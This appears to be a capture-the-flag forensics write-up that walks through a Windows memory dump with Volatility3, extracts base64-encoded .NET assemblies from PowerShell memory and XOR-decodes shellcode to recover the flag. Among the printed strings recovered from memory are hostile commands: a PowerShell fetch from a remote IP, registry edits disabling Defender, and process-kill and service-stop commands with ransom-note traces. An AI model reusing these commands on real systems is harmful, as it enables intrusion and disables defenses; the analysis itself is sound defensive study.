# Pandora's Bane

Category: Forensics
Difficulty: insane
Points: 1000

************Category************: Forensics

****************Points:**************** 425

************************Difficulty:************************ insane

## Description

Having now the relic, Pandora is trying to create a plan to shut down the vessels. Unfortunately for her, the alien's intel is one step ahead, as they somehow know what she is up to. An incident response operation started as Pandora was sure the aliens had gained access to her teammate's host. Although many compromised hosts were found, only one sample is applicable for further analysis. If you neutralize this threat by analyzing the sample, Pandora will be able to proceed with her plan.

## Walkthrough

### File Analysis

We are given a single file, which is a memory dump. Unfortunately, no profiles were provided, but considering the previous challenge was with Volatility3, we can try and see if it automatically finds the right profile.

```python
vol3 -f mem.raw windows.pslist.PsList
```

and it works! Okay, so the first thing I like to do, is dump the output of the malfind plugin to a file, and check what’s up:

```python
vol3 -f mem.raw   windows.malfind.Malfind > malfind.txt
cat malfind.txt | grep -i vads
```

The processes that are returned are MsMpEng.exe, smartscreen.exe,  and powershell.exe. To be honest, it’s very likely Powershell is the evil file. 

Next, I like to dump the output of the filescan plugin to a text file. It’s good reference, and we can check what type of files there are:

```python
vol3 -f mem.raw  windows.filescan.FileScan > filescan.txt
cat filescan.txt | grep -F '\Users\' | grep -F '.exe'
```

Checking for a bunch of extensions, there is one returned for .txt, which is Powershell’s ConsoleHost_history.txt. Given that the process came back on the Malfind plugin, we can dump its contents: 

```python
vol3 -f mem.raw windows.dumpfiles.DumpFiles --virtaddr 0xdb8d3fd4d790
cat file.0xdb8d3fd4d790.0xdb8d3e24f5e0.DataSectionObject.ConsoleHost_history.txt.dat
#dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart
#whoami /all
```

Well, nothing of interest. Next, we can dump the whole process memory, and check it out with strings. A common word to check in powershell stuff is ‘bypass’

```python
vol3 -f mem.raw  windows.memmap.Memmap --pid 5644 --dump
strings -a -el pid.5644.dmp > pid.5644.dmp.txt
strings -a  pid.5644.dmp >> pid.5644.dmp.txt
cat pid.5644.dmp.txt | grep -i bypass

```

A potential POC ? 

```python
[.invoke('http://137.135.65.29/bypass.txt')
h5disable-computerrestore "c:\"powershell.exe -executionpolicy bypasstaskkill /f /im teamviewer.exetaskkill /f /im jusched.exenet stop mikroclientwservicenet stop mssql$mikronet stop foxitreaderservicewindows defender" /v disableantispyware /t reg_dword /d 1 /fadvanced" /v showsuperhidden /t reg_dword /d 1 /fhowtobackfiles.txt@protonmail.comencrypter

```

Maybe I’m tripping, but we can check the NetScan plugin and see if the address is returned

```python
vol3 -f mem.raw  windows.netscan.NetScan
```

Nothing.. It’s probably a Defender text. 

Now, checking the Powershell dump for ‘Base64’

```python
cat pid.5644.dmp.txt | grep -F Base64
```

and… bingo! There are a lot of different calls for ‘[System.Convert]::FromBase64String’, followed by long base64 encoded strings. We can quickly filter for them, save them to a file and load them in python:

```python

echo "import base64" > my_vals.py
cat pid.5644.dmp.txt | grep -F '[System.Convert]::FromBase64String' | sed 's/^.*FromBase64String/base64\.b64decode/g' | sed '/(\\/d' | tr '\n' ',' >> vals.py

sed -i '1s/^/my_vars = [/' vals.py
sed -i 's/(""),/("")]/g' vals.py
sed -i 's/(\\/(/g' vals.py
cat vals.py >> my_vals.py

```

### Malware Analysis

We have the files saved in a list, now we can import them and write them to a file:

Checking for potential strings:

```python
from my_vals import *
my_vars = [i for i in my_vars if i!= b'']
# had too ... [i for i in my_vars if b'HTB' in i]
[i for i in my_vars if b'HTB' in i] #none
len([i for i in my_vars if b'shellcode' in i])  
#6

[magic.from_buffer(i) for i in my_vars]
#all .NET 
```

We could try and dump the shellcodes directly using subprocess and calling ilspycmd, since they’re all .net assemblies

```python
import subprocess
from pwn import xor
import shutil
import glob
import os

def sub_process(fname,i):
    command = ['ilspycmd', '-o', str(i), '-p', fname]
    p = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = p.communicate()

```

```python
os.mkdir('shells')
for i in range(len(my_vars)):
    fname = 'shells/' + str(i) + '.exe'
    with open(fname, 'wb') as of:
        of.write(my_vars[i])
    os.mkdir('shells/'+str(i))
    sub_process(fname,'shells/'+str(i))
    shutil.rmtree('shells/' + str(i) + '/Properties')
    for file in glob.glob('shells/'+str(i) + '/*/**' ,recursive=True):
        if file.endswith('.cs'):
            dat = open(file,'r').read()
            if 'shellcode' in dat:
                pt = dat.replace('\t','').replace('\n','')
                shellcode_idx = pt.find('shellcode')
                end_arr = pt[shellcode_idx:].find('}')
                shellcode = pt[shellcode_idx:shellcode_idx+end_arr]
                shellcode = eval(shellcode[shellcode.find('{')+1:])
                key_idx = pt[shellcode_idx+end_arr:].find('{') 
                key_end = pt[shellcode_idx+end_arr+key_idx:].find('}')
                key = eval(pt[shellcode_idx+end_arr+key_idx:shellcode_idx+end_arr+key_idx+key_end][1:])
                enced = xor(shellcode,key)
                if b'HTB' in enced:
                    print(enced[enced.find(b'HTB'):])
                else:
                    print(enced)

#b"HTB{wsl_ox1d4t10n_4nd_rusty_m3m0ry_4rt1f4cts!!}' -AsPlainText -Force)\x00"

```

**************Flag:************** HTB{wsl_ox1d4t10n_4nd_rusty_m3m0ry_4rt1f4cts!!}